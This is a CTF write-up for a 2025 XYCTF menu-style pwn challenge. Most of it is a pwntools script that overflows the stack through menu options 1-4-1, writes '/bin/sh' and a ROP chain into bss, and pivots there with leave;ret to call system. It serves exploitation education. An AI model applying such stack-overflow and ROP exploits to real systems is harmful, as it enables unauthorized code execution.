---
title: 2025 XYCTF writeup by Mini-Venom（菜单 pwn + bss 写 /bin/sh + leave;ret）
contest: 2025 XYCTF
year: 2025
difficulty: medium
vuln_type: [rop, ret2libc, shellcode]
tags: [XYCTF 菜单 pwn, 1 4 1 选项触发, 栈溢出 0x40 字节, bss=0x405000+0xa00, leave_ret=0x40191B, rdi=0x4018e5, ret=0x40191C, /bin/sh 写到 bss 0x405a00, system plt 调]
attack_chain:
  - 菜单 1 4 1 触发栈溢出，0x40 字节 padding
  - payload = b'a'*0x40 + p64(bss+0x40) + p64(ret)*2 + p64(0x4018A8)
  - bss 0x405a00 写 /bin/sh\x00 + p64(rdi+1) + p64(rdi) + p64(sh) + p64(elf.plt['system'])
  - leave_ret 栈迁移到 bss
key_payload: "pay=b'/bin/sh\x00'+p64(rdi+1)+p64(rdi)+p64(sh)+p64(elf.plt['system'])"
one_liner: XYCTF 菜单 pwn：1 4 1 触发栈溢出 + bss 写 /bin/sh + ret;ret 对齐 + leave_ret 栈迁移 + system("/bin/sh")。
lesson: ret;ret gadget 用来 16 字节对齐栈（system 之类要求 movaps 16 字节对齐）；rdi+1 是 ret 替代（gadget 中间夹杂 ret）。
quality: high
---

# 2025 XYCTF writeup by Mini-Venom

## Pwn 菜单题

```python
rdi = 0x00000000004018e5
leave_ret = 0x40191B
ret = 0x40191C
bss = 0x405000 + 0xa00

sl(b'1')  # 选项 1
sleep(1)
sl(b'4')  # 选项 4
sleep(1)
sl(b'1')  # 选项 1 触发漏洞
sleep(0.5)

# 第一次 read：栈溢出
payload = b'a'*0x40 + p64(bss+0x40) + p64(ret)*2 + p64(0x4018A8)
s(payload)

# 第二次 read：bss 0x405a00 写 /bin/sh + system
sh = 0x405a00
pay = b'/bin/sh\x00' + p64(rdi+1) + p64(rdi) + p64(sh) + p64(elf.plt['system'])
payload = pay.ljust(0x40, b'\x00') + p64(0x405a00) + p64(leave_ret)
s(payload)
```

## 关键 gadget

- `ret = 0x40191C`：纯 ret gadget，做 16 字节对齐（system 调 movaps 16 字节对齐）
- `rdi+1 = 0x4018e6`：在 rdi=0x4018e5 后+1，作为 `ret` 等价 gadget（CTF 套路，rdi 末尾是 0xe5 = pop r15; ret 之类）
- `rdi = 0x4018e5`：pop rdi; ret
- `leave_ret = 0x40191B`：leave; ret

## 攻击链

1. 第一次栈溢出：覆盖 rbp 到 bss+0x40，覆盖 ret 到 ret;ret;ret + 跳到漏洞函数
2. 第二次 read：写到 bss 0x405a00 起始，放 `/bin/sh\x00` + rdi+1;rdi;sh;system
3. leave_ret 触发栈迁移到 bss 0x405a00 → 执行 system("/bin/sh")
